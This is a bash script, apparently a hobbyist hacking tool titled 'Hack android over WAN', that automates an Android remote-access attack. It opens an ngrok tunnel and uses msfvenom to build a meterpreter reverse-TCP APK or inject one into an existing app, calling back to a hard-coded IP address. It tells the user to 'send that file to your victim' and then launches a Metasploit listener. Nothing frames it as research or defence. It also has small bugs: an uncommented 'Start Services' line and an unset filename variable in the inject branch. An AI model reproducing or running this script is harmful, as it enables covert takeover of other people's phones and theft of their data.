#! /bin/bash
mkdir /root/Desktop/MSF_PAYLOADS
#Confirmation
echo "Hack android over WAN by CattSec"
echo "#IMPORTANT# You need to have ngrok installed on your machine first. Do you have NGROK installed? [y/n]: "
read yn
case "$yn" in
	[nN]*)
	echo "Please head over to 'https://ngrok.com/download' to download it for your distro";;
	*)
	echo "All good";;
esac
Start Services
echo "Starting Ngrok Server on port 4444..."
sleep 2
xterm -hold -e ./ngrok tcp 4444 &
echo "Starting POSTGRESQL services..."
sleep 2
xterm -e service postgresql start
echo "Please enter the port number you see next to 'tcp://0.ngrok.io:_____'"
read port
#Make Payload
echo "Would you like to generate a payload or inject a payload? [g/i]: "
read answer
case "$answer" in
	[gG]*)
	echo "Please enter the name of your android payload: "
	read pn
	echo "OK, generating android payload..."
	sleep 1
	msfvenom -p android/meterpreter/reverse_tcp lhost=52.15.72.79 lport="$port" R > /root/Desktop/MSF_PAYLOADS/"$pn".apk ;;
	*)
	echo "Please enter the name of your android payload: "
	echo "Please specify the location of the apk file you want to inject: "
	read apk
	echo "Injecting Payload into apk file..."
	sleep 2
	msfvenom -x "$apk" -p android/meterpreter/reverse_tcp lhost=52.15.72.79 lport=$port -o /root/Desktop/MSF_PAYLOAD$pn.apk ;;
esac

echo "ALl Done. Payloads are saved in /root/Desktop/MSF_PAYLOADS"

echo "Now send that file to your victim"
#Begin Listener
echo "Would you like to start a listener? [y/n]: "
read answer2
case "$answer2" in
	[yY]*)
	echo "Starting lister for your payload..."
	sleep 2
	touch meterpreter.rc
	echo use exploit/multi/handler >> meterpreter.rc
	echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc	
	echo set lhost 0.0.0.0 >> meterpreter.rc
	echo set lport 4444 >> meterpreter.rc
	echo exploit >> meterpreter.rc 
	msfconsole -r meterpreter.rc ;;
	*)
	echo "OK, Script Finished" ;;
esac
exit


